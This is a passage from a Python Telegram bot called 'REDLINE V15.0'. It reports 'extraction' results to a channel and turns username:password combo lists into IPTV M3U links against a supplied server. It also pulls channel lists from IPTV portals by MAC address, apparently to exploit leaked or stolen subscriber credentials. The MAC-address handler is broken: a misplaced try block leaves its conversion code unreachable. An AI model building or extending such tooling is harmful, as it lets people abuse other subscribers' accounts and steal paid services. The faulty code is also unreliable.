            if target_channel is not None:
                await context.bot.send_message(
                    chat_id=target_channel,
                    text=(
                        f"📊 <b>New Extraction</b>\n"
                        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                        f"👤 User: {update.effective_user.mention_html()}\n"
                        f"📁 Type: {result_type}\n"
                        f"🎯 Results: {len(results):,}\n"
                        f"⏰ {datetime.now().strftime('%H:%M:%S')}"
                    ),
                    parse_mode='HTML'
                )
        except Exception as e:
            logger.warning(f"Could not post to channel: {e}")
        
    except Exception as e:
        logger.error(f"Error processing file: {e}")
        await status_msg.edit_text(
            f"❌ <b>Error occurred</b>\n\n"
            f"Please try again\n"
            f"Error: {str(e)}",
            parse_mode='HTML'
        )
        
        # Clean up on error
        if os.path.exists(file_path):
            os.remove(file_path)
        context.user_data.clear()

async def handle_text_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle text messages - for Base URL input and Phase 1 flows"""
    if not allowed_chat(update):
        try:
            chat = update.effective_chat
            txt = getattr(update.effective_message,'text',None)
            logger.info(f"Blocked text from chat type={getattr(chat,'type',None)} id={getattr(chat,'id',None)} text={txt}")
        except Exception:
            pass
        return
    if update.effective_chat and not _allow_rate(update.effective_chat.id):
        return
    mode = context.user_data.get('mode')
    # Support /redline in channels or allowed private
    if update.effective_message and getattr(update.effective_message, 'text', None):
        txt = update.effective_message.text.strip()
        if txt.startswith('/redline'):
            await start(update, context)
            return
    
    # Check if we're in combo_to_m3u mode and waiting for base URL
    if mode == 'combo_to_m3u' and 'combo_data' in context.user_data:
        base_url = update.message.text.strip()
        
        # Validate URL format
        if not base_url.startswith(('http://', 'https://')):
            await update.message.reply_text(
                "❌ <b>Invalid URL!</b>\n\n"
                "URL must start with http:// or https://\n\n"
                "<b>Example:</b>\n"
                "<code>http://example.com:8080</code>",
                parse_mode='HTML'
            )
            return
        
        # Remove trailing slash
        base_url = base_url.rstrip('/')
        
        # Show processing message
        status_msg = await update.message.reply_text(
            "⏳ <b>Converting Combo→M3U...</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "🔄 Creating M3U links...",
            parse_mode='HTML'
        )
        try:
            await context.bot.send_chat_action(chat_id=update.effective_chat.id, action=ChatAction.TYPING)
        except Exception:
            pass
        
        try:
            # Get stored combo data
            combo_data = context.user_data.get('combo_data', '')
            
            # Convert combo to M3U
            results = M3UConverter.combo_to_m3u(combo_data, base_url)
            
            if not results:
                await status_msg.edit_text(
                    "❌ <b>No valid combos found!</b>\n\n"
                    "Make sure file contains username:password format",
                    parse_mode='HTML'
                )
                context.user_data.clear()
                return
            
            # Create result file
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            result_filename = f"COMBO_TO_M3U_{timestamp}.txt"
            result_path = os.path.join(TEMP_DIR, result_filename)
            
            with open(result_path, 'w', encoding='utf-8') as f:
                f.write(f"# Combo to M3U Conversion\n")
                f.write(f"# Converted: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"# Base URL: {base_url}\n")
                f.write(f"# Total M3U Links: {len(results)}\n")
                f.write("#" + "="*50 + "\n\n")
                f.write('\n'.join(sorted(results)))
            
            # Send result
            with open(result_path, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    filename=result_filename,
                    caption=(
                        f"✅ <b>Combo→M3U Complete!</b>\n"
                        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                        f"📊 Created: {len(results):,} M3U links\n"
                        f"🌐 Base URL: <code>{base_url}</code>\n"
                        f"📅 {datetime.now().strftime('%Y-%m-%d %H:%M')}"
                    ),
                    parse_mode='HTML',
                    reply_markup=get_main_menu()
                )
            
            await status_msg.delete()
            os.remove(result_path)
            context.user_data.clear()
            
        except Exception as e:
            logger.error(f"Error in combo_to_m3u: {e}")
            await status_msg.edit_text(
                f"❌ <b>Error occurred</b>\n\n"
                f"Please try again\n"
                f"Error: {str(e)}",
                parse_mode='HTML'
            )
            context.user_data.clear()
        return
    
    # MAC→M3U flow: ask host then MAC
    if mode == 'mac_to_m3u':
        step = context.user_data.get('step')
        if step == 'ask_host':
            host = update.message.text.strip()
            if not host.startswith(('http://','https://')):
                await update.message.reply_html("❌ <b>Invalid host</b>\nExample: <code>http://example.com:8080</code>")
                return
            context.user_data['host'] = host.rstrip('/')
            context.user_data['step'] = 'ask_mac'
            await update.message.reply_html(
                "✅ Host saved!\n\n📝 Now send MAC address (format: <code>00:1A:79:xx:xx:xx</code>)"
            )
            return
        elif step == 'ask_mac':
            mac = update.message.text.strip().upper()
            if not re.match(r"(?i)^[0-9A-F]{2}(:[0-9A-F]{2}){5}$", mac):
                await update.message.reply_html("❌ <b>Invalid MAC format</b>")
                return
            host = context.user_data.get('host')
            status_msg = await update.message.reply_html("⏳ <b>Fetching channels...</b>")
        try:
            await context.bot.send_chat_action(chat_id=update.effective_chat.id, action=ChatAction.UPLOAD_DOCUMENT)
        except Exception:
            pass
            channels, err = MACConverter.mac_to_m3u(host, mac)
            if err or not channels:
                await status_msg.edit_text(
                    f"❌ <b>Failed</b>\n{err or 'No channels found'}",
                    parse_mode='HTML'
                )
                context.user_data.clear()
                return
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            result_filename = f"MAC_TO_M3U_{timestamp}.m3u"
            result_path = os.path.join(TEMP_DIR, result_filename)
            with open(result_path, 'w', encoding='utf-8') as f:
                f.write('#EXTM3U\n')
                for ch in channels:
                    name = ch.get('name','Channel')
                    num = ch.get('number','0')
                    url = ch.get('url','')
                    f.write(f"#EXTINF:-1 tvg-id=\"\" tvg-name=\"{name}\" tvg-logo=\"\" group-title=\"\",{name}\n")
                    f.write(f"{url}\n")
            with open(result_path, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    filename=result_filename,
                    caption=(
                        f"✅ <b>MAC→M3U Complete!</b>\n"
                        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                        f"📊 Channels: {len(channels):,}\n"
                        f"🌐 Host: <code>{host}</code>\n"
                        f"🖥️ MAC: <code>{mac}</code>"
                    ),
                    parse_mode='HTML',
                    reply_markup=get_main_menu()
                )
            await status_msg.delete()
            os.remove(result_path)
            context.user_data.clear()
            return
    
    # M3U→MAC via text (paste URLs)
    if mode == 'm3u_to_mac':
        lines = [l.strip() for l in update.message.text.split('\n') if l.strip()]
        mac_urls = MACConverter.m3u_to_mac('\n'.join(lines))
        if not mac_urls:
            await update.message.reply_html("❌ <b>No valid M3U links in text</b>")
            return
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        result_filename = f"M3U_TO_MAC_{timestamp}.m3u"
        result_path = os.path.join(TEMP_DIR, result_filename)
        with open(result_path, 'w', encoding='utf-8') as f:
            f.write('#EXTM3U\n')
            for url in sorted(mac_urls):
                f.write(f"{url}\n")
        with open(result_path, 'rb') as f:
            await update.message.reply_document(
                document=f,
                filename=result_filename,
                caption=(
                    f"✅ <b>M3U→MAC Complete!</b>\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"📊 URLs: {len(mac_urls):,}"
                ),
                parse_mode='HTML',
                reply_markup=get_main_menu()
            )
        os.remove(result_path)
        context.user_data.clear()
        return

    # Fallback
    await update.message.reply_text(
        "ℹ️ <b>Unknown command</b>\n\n"
        "Use /redline to show menu",
        parse_mode='HTML'
    )

# ============================================
# MAIN - START BOT
# ============================================

def main():
    """Start the bot"""
    logger.info("🤖 Starting REDLINE V15.0 Telegram Bot...")
    
    # Create application with proxy support (if Telegram is blocked)
    # Uncomment the proxy lines below if you need to use a proxy
    
    # Option 1: Without proxy (normal)
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Option 2: With HTTP proxy (if Telegram blocked - uncomment these)
    # from telegram.request import HTTPXRequest
    # request = HTTPXRequest(proxy_url="http://your-proxy:port")
    # application = Application.builder().token(BOT_TOKEN).request(request).build()
    
    # Option 3: With SOCKS5 proxy (if Telegram blocked - uncomment these)
    # from telegram.request import HTTPXRequest
    # request = HTTPXRequest(proxy_url="socks5://your-proxy:port")
    # application = Application.builder().token(BOT_TOKEN).request(request).build()
    
    # Start health server for platform TCP checks
    start_health_server()

    # Add handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("redline", start))
    application.add_handler(CommandHandler("health", health_cmd))
    application.add_handler(CommandHandler("help", help_cmd))
    application.add_handler(CallbackQueryHandler(button_callback))
    # Private/group messages (we guard inside)
    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text_message))
    # Channel posts (use MessageHandler with channel chat type filter)
    application.add_handler(MessageHandler(filters.ChatType.CHANNEL & filters.Document.ALL, handle_document))
    application.add_handler(MessageHandler(filters.ChatType.CHANNEL & (filters.TEXT | filters.COMMAND), handle_text_message))

    # Register global error handler
    application.add_error_handler(error_handler)

    # JobQueue: temp cleanup every 10 minutes
    async def _cleanup_temp_cb(context: ContextTypes.DEFAULT_TYPE):
        try:
            cutoff = time.time() - 15 * 60
            for name in os.listdir(TEMP_DIR):
                p = os.path.join(TEMP_DIR, name)
                try:
                    if os.path.isfile(p) and os.path.getmtime(p) < cutoff:
                        os.remove(p)
                except Exception:
                    continue
        except Exception:
            pass

    application.job_queue.run_repeating(_cleanup_temp_cb, interval=600, first=120)
    
    # Start bot
    if not ALLOWED_CHANNEL_IDS:
        logger.warning("No channels configured. Set CHANNEL_IDS or CHANNEL_ID env vars.")
    logger.info("✅ Bot is running! Press Ctrl+C to stop.")
    logger.info(f"📱 Channels: {sorted(list(ALLOWED_CHANNEL_IDS))}")
    
    # Run bot
    application.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        logger.info("🛑 Bot stopped by user")
    except Exception as e:
        logger.error(f"❌ Bot error: {e}")
